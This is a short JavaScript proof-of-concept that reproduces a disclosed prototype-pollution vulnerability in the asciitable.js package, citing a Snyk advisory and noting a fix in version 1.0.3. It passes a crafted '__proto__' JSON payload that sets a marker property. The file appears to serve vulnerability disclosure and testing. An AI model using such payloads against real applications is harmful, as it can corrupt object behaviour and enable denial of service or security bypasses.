//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
// PP has been fixed in 1.0.3
const req = require("asciitable.js");
const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req({}, b);
